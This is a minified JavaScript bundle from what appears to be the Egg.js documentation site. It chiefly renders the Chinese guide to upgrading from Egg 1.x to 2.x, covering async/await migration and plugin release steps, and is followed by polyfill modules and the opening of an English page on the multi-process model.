\u7684\u7406\u5ff5\u4e4b\u4e00\u662f",r.a.createElement("code",null,"\u6e10\u8fdb\u5f0f\u589e\u5f3a"),"\uff0c\u6545\u6211\u4eec\u4e3a\u5f00\u53d1\u8005\u63d0\u4f9b",r.a.createElement("code",null,"\u6e10\u8fdb\u5347\u7ea7"),"\u7684\u4f53\u9a8c\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["AnchorLink"],{to:"#%E5%BF%AB%E9%80%9F%E5%8D%87%E7%BA%A7"},"\u5feb\u901f\u5347\u7ea7")),r.a.createElement("li",null,r.a.createElement(l["AnchorLink"],{to:"#%E6%8F%92%E4%BB%B6%E5%8F%98%E6%9B%B4%E8%AF%B4%E6%98%8E"},"\u63d2\u4ef6\u53d8\u66f4\u8bf4\u660e")),r.a.createElement("li",null,r.a.createElement(l["AnchorLink"],{to:"#%E8%BF%9B%E4%B8%80%E6%AD%A5%E5%8D%87%E7%BA%A7"},"\u8fdb\u4e00\u6b65\u5347\u7ea7")),r.a.createElement("li",null,r.a.createElement(l["AnchorLink"],{to:"#%E6%8F%92%E4%BB%B6%E5%8D%87%E7%BA%A7"},"\u9488\u5bf9",r.a.createElement("code",null,"\u63d2\u4ef6\u5f00\u53d1\u8005"),"\u7684\u5347\u7ea7\u6307\u5357"))),r.a.createElement("h2",{id:"\u5feb\u901f\u5347\u7ea7"},r.a.createElement(l["AnchorLink"],{to:"#\u5feb\u901f\u5347\u7ea7","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5feb\u901f\u5347\u7ea7"),r.a.createElement("ul",null,r.a.createElement("li",null,"Node.js \u4f7f\u7528\u6700\u65b0\u7684 LTS \u7248\u672c\uff08",r.a.createElement("code",null,">=8.9.0"),"\uff09\u3002"),r.a.createElement("li",null,"\u4fee\u6539 ",r.a.createElement("code",null,"package.json")," \u4e2d ",r.a.createElement("code",null,"egg")," \u7684\u4f9d\u8d56\u4e3a ",r.a.createElement("code",null,"^2.0.0"),"\u3002"),r.a.createElement("li",null,"\u68c0\u67e5\u76f8\u5173\u63d2\u4ef6\u662f\u5426\u53d1\u5e03\u65b0\u7248\u672c\uff08\u53ef\u9009\uff09\u3002"),r.a.createElement("li",null,"\u91cd\u65b0\u5b89\u88c5\u4f9d\u8d56\uff0c\u8dd1\u5355\u5143\u6d4b\u8bd5\u3002")),r.a.createElement("p",null,r.a.createElement("strong",null,"\u641e\u5b9a\uff01\u51e0\u4e4e\u4e0d\u9700\u8981\u4fee\u6539\u4efb\u4f55\u4e00\u884c\u4ee3\u7801\uff0c\u5c31\u5df2\u7ecf\u5b8c\u6210\u4e86\u5347\u7ea7\u3002")),r.a.createElement("h2",{id:"\u63d2\u4ef6\u53d8\u66f4\u8bf4\u660e"},r.a.createElement(l["AnchorLink"],{to:"#\u63d2\u4ef6\u53d8\u66f4\u8bf4\u660e","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u63d2\u4ef6\u53d8\u66f4\u8bf4\u660e"),r.a.createElement("h3",{id:"egg-multipart"},r.a.createElement(l["AnchorLink"],{to:"#egg-multipart","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"egg-multipart"),r.a.createElement("p",null,r.a.createElement("code",null,"yield parts")," \u9700\u4fee\u6539\u4e3a ",r.a.createElement("code",null,"await parts()")," \u6216 ",r.a.createElement("code",null,"yield parts()")),r.a.createElement(o["a"],{code:"// old\nconst parts = ctx.multipart();\nwhile ((part = yield parts) != null) {\n  // do something\n}\n\n// yield parts() also work\nwhile ((part = yield parts()) != null) {\n  // do something\n}\n\n// new\nconst parts = ctx.multipart();\nwhile ((part = await parts()) != null) {\n  // do something\n}",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-multipart#upload-multiple-files"},"egg-multipart#upload-multiple-files"))),r.a.createElement("h3",{id:"egg-userrole"},r.a.createElement(l["AnchorLink"],{to:"#egg-userrole","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"egg-userrole"),r.a.createElement("p",null,"\u4e0d\u518d\u517c\u5bb9 1.x \u5f62\u5f0f\u7684 role \u5b9a\u4e49\uff0c\u56e0\u4e3a koa-roles \u5df2\u7ecf\u65e0\u6cd5\u517c\u5bb9\u4e86\u3002 \u8bf7\u6c42\u4e0a\u4e0b\u6587 ",r.a.createElement("code",null,"Context")," \u4ece this \u4f20\u5165\u6539\u6210\u4e86\u7b2c\u4e00\u4e2a\u53c2\u6570 ",r.a.createElement("code",null,"ctx")," \u4f20\u5165\uff0c\u539f\u6709\u7684 ",r.a.createElement("code",null,"scope")," \u53d8\u6210\u4e86\u7b2c\u4e8c\u4e2a\u53c2\u6570\u3002"),r.a.createElement(o["a"],{code:"// old\napp.role.use('user', function () {\n  return !!this.user;\n});\n\n// new\napp.role.use((ctx, scope) => {\n  return !!ctx.user;\n});\n\napp.role.use('user', (ctx) => {\n  return !!ctx.user;\n});",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/koajs/koa-roles/pull/13"},"koajs/koa-roles#13")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-userrole/pull/9"},"eggjs/egg-userrole#9"))),r.a.createElement("h2",{id:"\u8fdb\u4e00\u6b65\u5347\u7ea7"},r.a.createElement(l["AnchorLink"],{to:"#\u8fdb\u4e00\u6b65\u5347\u7ea7","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8fdb\u4e00\u6b65\u5347\u7ea7"),r.a.createElement("p",null,"\u5f97\u76ca\u4e8e Egg \u5bf9 1.x \u7684",r.a.createElement("strong",null,"\u5b8c\u5168\u517c\u5bb9"),"\uff0c\u6211\u4eec\u53ef\u4ee5\u5982\u4f55\u975e\u5e38\u5feb\u901f\u7684\u5b8c\u6210\u5347\u7ea7\u3002"),r.a.createElement("p",null,"\u4e0d\u8fc7\uff0c\u4e3a\u4e86\u66f4\u597d\u7684\u7edf\u4e00\u4ee3\u7801\u98ce\u683c\uff0c\u4ee5\u53ca\u66f4\u4f73\u7684\u6027\u80fd\u548c\u9519\u8bef\u5806\u6808\uff0c\u6211\u4eec\u5efa\u8bae\u5f00\u53d1\u8005\u8fdb\u4e00\u6b65\u5347\u7ea7\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u4fee\u6539\u4e3a\u63a8\u8350\u7684\u4ee3\u7801\u98ce\u683c\uff0c\u4f20\u9001\u95e8\uff1a",r.a.createElement(l["Link"],{to:"../community/style-guide"},"\u4ee3\u7801\u98ce\u683c\u6307\u5357")),r.a.createElement("li",null,r.a.createElement(l["AnchorLink"],{to:"#%E4%B8%AD%E9%97%B4%E4%BB%B6%E4%BD%BF%E7%94%A8-Koa2-%E9%A3%8E%E6%A0%BC"},"\u4e2d\u95f4\u4ef6\u4f7f\u7528 Koa2 \u98ce\u683c")),r.a.createElement("li",null,r.a.createElement(l["AnchorLink"],{to:"#yieldable-To-awaitable"},"\u51fd\u6570\u8c03\u7528\u7684 ",r.a.createElement("code",null,"yieldable")," \u8f6c\u4e3a ",r.a.createElement("code",null,"awaitable")))),r.a.createElement("h3",{id:"\u4e2d\u95f4\u4ef6\u4f7f\u7528-koa2-\u98ce\u683c"},r.a.createElement(l["AnchorLink"],{to:"#\u4e2d\u95f4\u4ef6\u4f7f\u7528-koa2-\u98ce\u683c","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4e2d\u95f4\u4ef6\u4f7f\u7528 Koa2 \u98ce\u683c"),r.a.createElement("blockquote",null,r.a.createElement("p",null,"2.x \u4ecd\u7136\u4fdd\u6301\u5bf9 1.x \u98ce\u683c\u7684\u4e2d\u95f4\u4ef6\u7684\u517c\u5bb9\uff0c\u6545\u4e0d\u4fee\u6539\u4e5f\u80fd\u7ee7\u7eed\u4f7f\u7528\u3002")),r.a.createElement("ul",null,r.a.createElement("li",null,"\u8fd4\u56de\u7684\u51fd\u6570\u5165\u53c2\u6539\u4e3a Koa 2 \u7684 ",r.a.createElement("code",null,"(ctx, next)")," \u98ce\u683c\u3002",r.a.createElement("ul",null,r.a.createElement("li",null,"\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a ",r.a.createElement("code",null,"ctx"),"\uff0c\u4ee3\u8868\u5f53\u524d\u8bf7\u6c42\u7684\u4e0a\u4e0b\u6587\uff0c\u662f ",r.a.createElement(l["AnchorLink"],{to:"../basics/extend#Context"},"Context")," \u7684\u5b9e\u4f8b\u3002"),r.a.createElement("li",null,"\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a ",r.a.createElement("code",null,"next"),"\uff0c\u7528 await \u6267\u884c\u5b83\u6765\u6267\u884c\u540e\u7eed\u4e2d\u95f4\u4ef6\u7684\u903b\u8f91\u3002"))),r.a.createElement("li",null,"\u4e0d\u5efa\u8bae\u4f7f\u7528 ",r.a.createElement("code",null,"async (ctx, next) => ","{","}")," \u683c\u5f0f\uff0c\u907f\u514d\u9519\u8bef\u5806\u6808\u4e22\u5931\u51fd\u6570\u540d\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"yield next")," \u6539\u4e3a\u51fd\u6570\u8c03\u7528 ",r.a.createElement("code",null,"await next()")," \u7684\u65b9\u5f0f\u3002")),r.a.createElement(o["a"],{code:"// 1.x\nmodule.exports = () => {\n  return function* responseTime(next) {\n    const start = Date.now();\n    yield next;\n    const delta = Math.ceil(Date.now() - start);\n    this.set('X-Response-Time', delta + 'ms');\n  };\n};\n\n// 2.x\nmodule.exports = () => {\n  return async function responseTime(ctx, next) {\n    const start = Date.now();\n    // \u6ce8\u610f\uff0c\u548c generator function \u683c\u5f0f\u7684\u4e2d\u95f4\u4ef6\u4e0d\u540c\uff0c\u6b64\u65f6 next \u662f\u4e00\u4e2a\u65b9\u6cd5\uff0c\u5fc5\u987b\u8981\u8c03\u7528\u5b83\n    await next();\n    const delta = Math.ceil(Date.now() - start);\n    ctx.set('X-Response-Time', delta + 'ms');\n  };\n};",lang:"js"}),r.a.createElement("h3",{id:"yieldable-to-awaitable"},r.a.createElement(l["AnchorLink"],{to:"#yieldable-to-awaitable","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"yieldable to awaitable"),r.a.createElement("blockquote",null,r.a.createElement("p",null,"\u6211\u4eec\u65e9\u5728 Egg 1.x \u65f6\u5c31\u5df2\u7ecf\u652f\u6301 async\uff0c\u6545\u82e5\u5e94\u7528\u5c42\u5df2\u7ecf\u662f async-base \u7684\uff0c\u5c31\u53ef\u4ee5\u8df3\u8fc7\u672c\u5c0f\u8282\u5185\u5bb9\u4e86\u3002")),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/tj/co"},"co")," \u652f\u6301\u4e86 ",r.a.createElement("code",null,"yieldable")," \u517c\u5bb9\u7c7b\u578b\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"promises"),r.a.createElement("li",null,"array (parallel execution)"),r.a.createElement("li",null,"objects (parallel execution)"),r.a.createElement("li",null,"thunks (functions)"),r.a.createElement("li",null,"generators (delegation)"),r.a.createElement("li",null,"generator functions (delegation)")),r.a.createElement("p",null,"\u5c3d\u7ba1 ",r.a.createElement("code",null,"generator")," \u548c ",r.a.createElement("code",null,"async")," \u4e24\u8005\u7684\u7f16\u7a0b\u6a21\u578b\u57fa\u672c\u4e00\u6a21\u4e00\u6837\uff0c\u4f46\u7531\u4e8e\u4e0a\u8ff0\u7684 ",r.a.createElement("code",null,"co")," \u7684\u4e00\u4e9b\u7279\u6b8a\u5904\u7406\uff0c\u5bfc\u81f4\u5728\u79fb\u9664 ",r.a.createElement("code",null,"co")," \u540e\uff0c\u6211\u4eec\u9700\u8981\u6839\u636e\u4e0d\u540c\u573a\u666f\u81ea\u884c\u5904\u7406\uff1a"),r.a.createElement("h4",{id:"promise"},r.a.createElement(l["AnchorLink"],{to:"#promise","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"promise"),r.a.createElement("p",null,"\u76f4\u63a5\u66ff\u6362\u5373\u53ef\uff1a"),r.a.createElement(o["a"],{code:"function echo(msg) {\n  return Promise.resolve(msg);\n}\n\nyield echo('hi egg');\n// change to\nawait echo('hi egg');",lang:"js"}),r.a.createElement("h4",{id:"array---yield-"},r.a.createElement(l["AnchorLink"],{to:"#array---yield-","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"array - yield []"),r.a.createElement("p",null,r.a.createElement("code",null,"yield []")," \u5e38\u7528\u4e8e\u5e76\u53d1\u8bf7\u6c42\uff0c\u5982\uff1a"),r.a.createElement(o["a"],{code:"const [ news, user ] = yield [\n  ctx.service.news.list(topic),\n  ctx.service.user.get(uid),\n];",lang:"js"}),r.a.createElement("p",null,"\u8fd9\u79cd\u4fee\u6539\u8d77\u6765\u6bd4\u8f83\u7b80\u5355\uff0c\u7528 ",r.a.createElement("code",null,"Promise.all()")," \u5305\u88c5\u4e0b\u5373\u53ef\uff1a"),r.a.createElement(o["a"],{code:"const [news, user] = await Promise.all([\n  ctx.service.news.list(topic),\n  ctx.service.user.get(uid),\n]);",lang:"js"}),r.a.createElement("h4",{id:"object---yield-"},r.a.createElement(l["AnchorLink"],{to:"#object---yield-","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"object - yield ","{","}"),r.a.createElement("p",null,r.a.createElement("code",null,"yield ","{","}")," \u548c ",r.a.createElement("code",null,"yield map")," \u7684\u65b9\u5f0f\u4e5f\u5e38\u7528\u4e8e\u5e76\u53d1\u8bf7\u6c42\uff0c\u4f46\u7531\u4e8e ",r.a.createElement("code",null,"Promise.all")," \u4e0d\u652f\u6301 Object\uff0c\u4f1a\u7a0d\u5fae\u6709\u70b9\u590d\u6742\u3002"),r.a.createElement(o["a"],{code:"// app/service/biz.js\nclass BizService extends Service {\n  * list(topic, uid) {\n    return {\n      news: ctx.service.news.list(topic),\n      user: ctx.service.user.get(uid),\n    };\n  }\n}\n\n// app/controller/home.js\nconst { news, user } = yield ctx.service.biz.list(topic, uid);",lang:"js"}),r.a.createElement("p",null,"\u5efa\u8bae\u4fee\u6539\u4e3a ",r.a.createElement("code",null,"await Promise.all([])")," \u7684\u65b9\u5f0f\uff1a"),r.a.createElement(o["a"],{code:"// app/service/biz.js\nclass BizService extends Service {\n  list(topic, uid) {\n    return Promise.all([\n      ctx.service.news.list(topic),\n      ctx.service.user.get(uid),\n    ]);\n  }\n}\n\n// app/controller/home.js\nconst [news, user] = await ctx.service.biz.list(topic, uid);",lang:"js"}),r.a.createElement("p",null,"\u5982\u679c\u65e0\u6cd5\u4fee\u6539\u5bf9\u5e94\u7684\u63a5\u53e3\uff0c\u53ef\u4ee5\u4e34\u65f6\u517c\u5bb9\u4e0b\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u4f7f\u7528\u6211\u4eec\u63d0\u4f9b\u7684 Utils \u65b9\u6cd5 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-core/blob/da4ba1784175c43217125f3d5cd7f0be3d5396bf/lib/egg.js#L353"},"app.toPromise"),"\u3002"),r.a.createElement("li",null,r.a.createElement("strong",null,"\u5efa\u8bae\u5c3d\u91cf\u6539\u6389\uff0c\u56e0\u4e3a\u5b9e\u9645\u4e0a\u5c31\u662f\u4e22\u7ed9 co\uff0c\u4f1a\u5e26\u56de\u5bf9\u5e94\u7684\u6027\u80fd\u635f\u5931\u548c\u5806\u6808\u95ee\u9898\u3002"))),r.a.createElement(o["a"],{code:"const { news, user } = await app.toPromise(ctx.service.biz.list(topic, uid));",lang:"js"}),r.a.createElement("h4",{id:"\u5176\u4ed6"},r.a.createElement(l["AnchorLink"],{to:"#\u5176\u4ed6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5176\u4ed6"),r.a.createElement("ul",null,r.a.createElement("li",null,"thunks (functions)"),r.a.createElement("li",null,"generators (delegation)"),r.a.createElement("li",null,"generator functions (delegation)")),r.a.createElement("p",null,"\u4fee\u6539\u4e3a\u5bf9\u5e94\u7684 async function \u5373\u53ef\uff0c\u5982\u679c\u4e0d\u80fd\u4fee\u6539\uff0c\u5219\u53ef\u4ee5\u7528 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-core/blob/da4ba1784175c43217125f3d5cd7f0be3d5396bf/lib/egg.js#L344"},"app.toAsyncFunction")," \u7b80\u5355\u5305\u88c5\u4e0b\u3002"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f")),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-core/blob/da4ba1784175c43217125f3d5cd7f0be3d5396bf/lib/egg.js#L344"},"toAsyncFunction")," \u548c ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-core/blob/da4ba1784175c43217125f3d5cd7f0be3d5396bf/lib/egg.js#L353"},"toPromise")," \u5b9e\u9645\u4f7f\u7528\u7684\u662f ",r.a.createElement(l["Link"],{to:"https://github.com/tj/co"},"co")," \u5305\u88c5\uff0c\u56e0\u6b64\u4f1a\u5e26\u56de\u5bf9\u5e94\u7684\u6027\u80fd\u635f\u5931\u548c\u5806\u6808\u95ee\u9898\uff0c\u5efa\u8bae\u5f00\u53d1\u8005\u8fd8\u662f\u5c3d\u91cf\u5168\u94fe\u8def\u5347\u7ea7\u3002"),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-core/blob/da4ba1784175c43217125f3d5cd7f0be3d5396bf/lib/egg.js#L344"},"toAsyncFunction")," \u5728\u8c03\u7528 async function \u65f6\u4e0d\u4f1a\u6709\u635f\u5931\u3002")),r.a.createElement("p",null,"@sindresorhus \u7f16\u5199\u4e86\u8bb8\u591a",r.a.createElement(l["Link"],{to:"https://github.com/sindresorhus/promise-fun"},"\u57fa\u4e8e promise \u7684 helper \u65b9\u6cd5"),"\uff0c\u7075\u6d3b\u7684\u8fd0\u7528\u5b83\u4eec\u914d\u5408 async function \u80fd\u8ba9\u4ee3\u7801\u66f4\u52a0\u5177\u6709\u53ef\u8bfb\u6027\u3002"),r.a.createElement("h2",{id:"\u63d2\u4ef6\u5347\u7ea7"},r.a.createElement(l["AnchorLink"],{to:"#\u63d2\u4ef6\u5347\u7ea7","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u63d2\u4ef6\u5347\u7ea7"),r.a.createElement("p",null,r.a.createElement("code",null,"\u5e94\u7528\u5f00\u53d1\u8005"),"\u53ea\u9700\u5347\u7ea7",r.a.createElement("code",null,"\u63d2\u4ef6\u5f00\u53d1\u8005"),"\u4fee\u6539\u540e\u7684\u4f9d\u8d56\u7248\u672c\u5373\u53ef\uff0c\u4e5f\u53ef\u4ee5\u7528\u6211\u4eec\u63d0\u4f9b\u7684\u547d\u4ee4 ",r.a.createElement("code",null,"egg-bin autod")," \u5feb\u901f\u66f4\u65b0\u3002"),r.a.createElement("p",null,"\u4ee5\u4e0b\u5185\u5bb9\u9488\u5bf9",r.a.createElement("code",null,"\u63d2\u4ef6\u5f00\u53d1\u8005"),"\uff0c\u6307\u5bfc\u5982\u4f55\u5347\u7ea7\u63d2\u4ef6\uff1a"),r.a.createElement("h3",{id:"\u5347\u7ea7\u4e8b\u9879"},r.a.createElement(l["AnchorLink"],{to:"#\u5347\u7ea7\u4e8b\u9879","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5347\u7ea7\u4e8b\u9879"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5b8c\u6210\u4e0a\u9762\u7ae0\u8282\u63d0\u5230\u7684\u5347\u7ea7\u9879\u3002",r.a.createElement("ul",null,r.a.createElement("li",null,"\u6240\u6709\u7684 ",r.a.createElement("code",null,"generator function")," \u6539\u4e3a ",r.a.createElement("code",null,"async function")," \u683c\u5f0f\u3002"),r.a.createElement("li",null,"\u5347\u7ea7\u4e2d\u95f4\u4ef6\u98ce\u683c\u3002"))),r.a.createElement("li",null,"\u63a5\u53e3\u517c\u5bb9\uff08\u53ef\u9009\uff09\uff0c\u5982\u4e0b\u3002"),r.a.createElement("li",null,"\u53d1\u5e03\u5927\u7248\u672c\u3002")),r.a.createElement("h3",{id:"\u63a5\u53e3\u517c\u5bb9"},r.a.createElement(l["AnchorLink"],{to:"#\u63a5\u53e3\u517c\u5bb9","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u63a5\u53e3\u517c\u5bb9"),r.a.createElement("p",null,"\u67d0\u4e9b\u573a\u666f\u4e0b\uff0c",r.a.createElement("code",null,"\u63d2\u4ef6\u5f00\u53d1\u8005"),"\u63d0\u4f9b\u7ed9",r.a.createElement("code",null,"\u5e94\u7528\u5f00\u53d1\u8005"),"\u7684\u63a5\u53e3\u662f\u540c\u65f6\u652f\u6301 generator \u548c async \u7684\uff0c\u4e00\u822c\u662f\u4f1a\u7528 co \u5305\u88c5\u4e00\u5c42\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5728 2.x \u91cc\u4e3a\u4e86\u66f4\u597d\u7684\u6027\u80fd\u548c\u9519\u8bef\u5806\u6808\uff0c\u6211\u4eec\u5efa\u8bae\u4fee\u6539\u4e3a ",r.a.createElement("code",null,"async-first"),"\u3002"),r.a.createElement("li",null,"\u5982\u6709\u9700\u8981\uff0c\u4f7f\u7528 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-core/blob/da4ba1784175c43217125f3d5cd7f0be3d5396bf/lib/egg.js#L344"},"toAsyncFunction")," \u548c ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-core/blob/da4ba1784175c43217125f3d5cd7f0be3d5396bf/lib/egg.js#L353"},"toPromise")," \u6765\u517c\u5bb9\u3002")),r.a.createElement("p",null,"\u8b6c\u5982 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-schedule"},"egg-schedule")," \u63d2\u4ef6\uff0c\u652f\u6301\u5e94\u7528\u5c42\u4f7f\u7528 generator \u6216 async \u5b9a\u4e49 task\u3002"),r.a.createElement(o["a"],{code:"// {app_root}/app/schedule/cleandb.js\nexports.task = function* (ctx) {\n  yield ctx.service.db.clean();\n};\n\n// {app_root}/app/schedule/log.js\nexports.task = async function splitLog(ctx) {\n  await ctx.service.log.split();\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("code",null,"\u63d2\u4ef6\u5f00\u53d1\u8005"),"\u53ef\u4ee5\u7b80\u5355\u5305\u88c5\u4e0b\u539f\u59cb\u51fd\u6570\uff1a"),r.a.createElement(o["a"],{code:"// https://github.com/eggjs/egg-schedule/blob/80252ef/lib/load_schedule.js#L38\ntask = app.toAsyncFunction(schedule.task);",lang:"js"}),r.a.createElement("h3",{id:"\u63d2\u4ef6\u53d1\u5e03\u89c4\u5219"},r.a.createElement(l["AnchorLink"],{to:"#\u63d2\u4ef6\u53d1\u5e03\u89c4\u5219","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u63d2\u4ef6\u53d1\u5e03\u89c4\u5219"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("strong",null,"\u9700\u8981\u53d1\u5e03\u5927\u7248\u672c"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u9664\u975e\u63d2\u4ef6\u63d0\u4f9b\u7684\u63a5\u53e3\u90fd\u662f promise \u7684\uff0c\u4e14\u4ee3\u7801\u91cc\u9762\u4e0d\u5b58\u5728 ",r.a.createElement("code",null,"async"),"\uff0c\u5982 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-nunjucks"},"egg-view-nunjucks"),"\u3002"))),r.a.createElement("li",null,"\u4fee\u6539 ",r.a.createElement("code",null,"package.json"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u4fee\u6539 ",r.a.createElement("code",null,"devDependencies")," \u4f9d\u8d56\u7684 ",r.a.createElement("code",null,"egg")," \u4e3a ",r.a.createElement("code",null,"^2.0.0"),"\u3002"),r.a.createElement("li",null,"\u4fee\u6539 ",r.a.createElement("code",null,"engines.node")," \u4e3a ",r.a.createElement("code",null,">=8.0.0"),"\u3002"),r.a.createElement("li",null,"\u4fee\u6539 ",r.a.createElement("code",null,"ci.version")," \u4e3a ",r.a.createElement("code",null,"8, 9"),"\uff0c \u5e76\u91cd\u65b0\u5b89\u88c5\u4f9d\u8d56\u4ee5\u4fbf\u751f\u6210\u65b0\u7684 travis \u914d\u7f6e\u6587\u4ef6\u3002"))),r.a.createElement("li",null,"\u4fee\u6539 ",r.a.createElement("code",null,"README.md")," \u7684\u793a\u4f8b\u4e3a async function\u3002"),r.a.createElement("li",null,"\u7f16\u5199\u5347\u7ea7\u6307\u5f15\u3002"),r.a.createElement("li",null,"\u4fee\u6539 ",r.a.createElement("code",null,"test/fixtures")," \u4e3a async function\uff0c\u53ef\u9009\uff0c\u5efa\u8bae\u5206\u5f00\u53e6\u4e00\u4e2a PR \u65b9\u4fbf Review\u3002")),r.a.createElement("p",null,"\u4e00\u822c\u8fd8\u4f1a\u9700\u8981\u7ee7\u7eed\u7ef4\u62a4\u4e0a\u4e00\u4e2a\u7248\u672c\uff0c\u6545\u9700\u8981\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5bf9\u4e0a\u4e00\u4e2a\u7248\u672c\u5efa\u7acb\u4e00\u4e2a ",r.a.createElement("code",null,"1.x")," \u8fd9\u7c7b\u7684 branch \u5206\u652f"),r.a.createElement("li",null,"\u4fee\u6539\u4e0a\u4e00\u4e2a\u7248\u672c\u7684 ",r.a.createElement("code",null,"package.json")," \u7684 ",r.a.createElement("code",null,"publishConfig.tag")," \u4e3a ",r.a.createElement("code",null,"release-1.x")),r.a.createElement("li",null,"\u8fd9\u6837\u5982\u679c\u4e0a\u4e00\u4e2a\u7248\u672c\u6709 BugFix \u65f6\uff0cnpm \u7248\u672c\u65f6\u5c31\u4f1a\u53d1\u5e03\u4e3a ",r.a.createElement("code",null,"release-1.x")," \u8fd9\u4e2a tag\uff0c\u7528\u6237\u901a\u8fc7 ",r.a.createElement("code",null,"npm i egg-xx@release-1.x")," \u6765\u5f15\u5165\u65e7\u7248\u672c\u3002"),r.a.createElement("li",null,"\u53c2\u89c1 ",r.a.createElement(l["Link"],{to:"https://docs.npmjs.com/cli/dist-tag"},"npm \u6587\u6863"),"\u3002"))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},MwLW:function(e,t,n){var a=n("9Rcy"),r=n("qUkb"),l=n("AcHn"),o=n("bUpX").f,i=function(e){return function(t){var n,i=l(t),c=r(i),s=c.length,u=0,d=[];while(s>u)n=c[u++],a&&!o.call(i,n)||d.push(e?[n,i[n]]:i[n]);return d}};e.exports={entries:i(!0),values:i(!1)}},"N/tQ":function(e,t,n){"use strict";function a(e){if(Array.isArray(e))return e}n.d(t,"a",(function(){return a}))},N0Us:function(e,t,n){var a=n("SCbZ"),r=Math.min;e.exports=function(e){return e>0?r(a(e),9007199254740991):0}},N4K1:function(e,t,n){"use strict";n.d(t,"a",(function(){return o})),n.d(t,"b",(function(){return l}));var a=n("AFTV"),r={basename:"/"};window.routerBase&&(r.basename=window.routerBase);var l=Object({NODE_ENV:"production"}).__IS_SERVER?null:Object(a["a"])(r),o=function(){var e=arguments.length>0&&void 0!==arguments[0]&&arguments[0];return e||(l=Object(a["a"])(r)),l}},NBU9:function(e,t,n){var a=n("oyD1"),r=n("wdLt"),l=n("N0Us"),o=n("G9w8"),i=n("TYe2"),c=n("Z3pt"),s=function(e,t){this.stopped=e,this.result=t},u=e.exports=function(e,t,n,u,d){var m,p,h,g,f,E,b,v=o(t,n,u?2:1);if(d)m=e;else{if(p=i(e),"function"!=typeof p)throw TypeError("Target is not iterable");if(r(p)){for(h=0,g=l(e.length);g>h;h++)if(f=u?v(a(b=e[h])[0],b[1]):v(e[h]),f&&f instanceof s)return f;return new s(!1)}m=p.call(e)}E=m.next;while(!(b=E.call(m)).done)if(f=c(m,v,b.value,u),"object"==typeof f&&f&&f instanceof s)return f;return new s(!1)};u.stop=function(e){return new s(!0,e)}},NIsy:function(e,t){function n(){throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}e.exports=n,e.exports.__esModule=!0,e.exports["default"]=e.exports},NKsF:function(e,t,n){"use strict";var a=n("0mt+"),r=n("WQtb").includes,l=n("QiLd"),o=n("hOjR"),i=o("indexOf",{ACCESSORS:!0,1:0});a({target:"Array",proto:!0,forced:!i},{includes:function(e){return r(this,e,arguments.length>1?arguments[1]:void 0)}}),l("includes")},NLWe:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=n("3dEy"),c=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"In the previous ",r.a.createElement(l["Link"],{to:"../core/cluster-and-ipc"},"Multi-Process Model chapter"),", we covered the multi-process model of the framework in detail, whose Agent process suits for a common class of scenarios: some middleware clients need to establish a persistent connection with server. In theory, a server had better establish only one persistent connection. However, the multi-process model will 